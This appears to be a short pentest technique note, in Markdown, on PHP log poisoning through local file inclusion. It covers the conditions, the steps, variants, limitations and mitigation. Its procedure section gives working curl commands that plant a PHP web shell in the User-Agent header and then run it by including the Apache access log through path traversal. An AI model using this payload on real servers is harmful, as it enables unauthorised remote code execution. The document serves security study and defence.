---
topic: PHP log poisoning
tags: [web, php, lfi, log-poisoning, rce]
---

# PHP log poisoning

[🌐 Español](php-log-poisoning.md) | **English**

## Concept

An application writes user input (User-Agent, URL, parameter) to a log file and later allows that file to be included. The attacker injects PHP into the log and executes it through the inclusion.

## When it applies

- LFI able to read `access.log` or an application log.
- Application logging headers without sanitisation.
- A log inside the webroot or reachable by the inclusion.

## Procedure

1. Confirm file inclusion and the log path.
2. Send a request with PHP in the `User-Agent`.
3. Include the log through the vulnerable parameter.
4. Run a harmless command before a shell.

```bash
curl -s http://<HOST>/ -A '<?php system($_GET["c"]); ?>'
curl -s "http://<HOST>/index.php?page=../../var/log/apache2/access.log&c=id"
```

## Variants

- `/var/log/apache2/access.log`, `error.log`, `auth.log`.
- Application logs under `storage/logs`.
- `php://input` or `data://` when enabled.
- Poisoning a session file.

## Limitations

- The log must be readable by the web user.
- The inclusion must not append a suffix.
- The server may encode characters.

## Mitigation and detection

- Do not include user-controllable files.
- Sanitise and encode data before logging.
- Keep logs outside the webroot with restrictive permissions.
- Alert on PHP in headers and on log inclusions.

## References

- <https://owasp.org/www-community/attacks/Log_Injection>
- <https://www.php.net/manual/en/security.filesystem.php>
- <https://attack.mitre.org/techniques/T1190/>
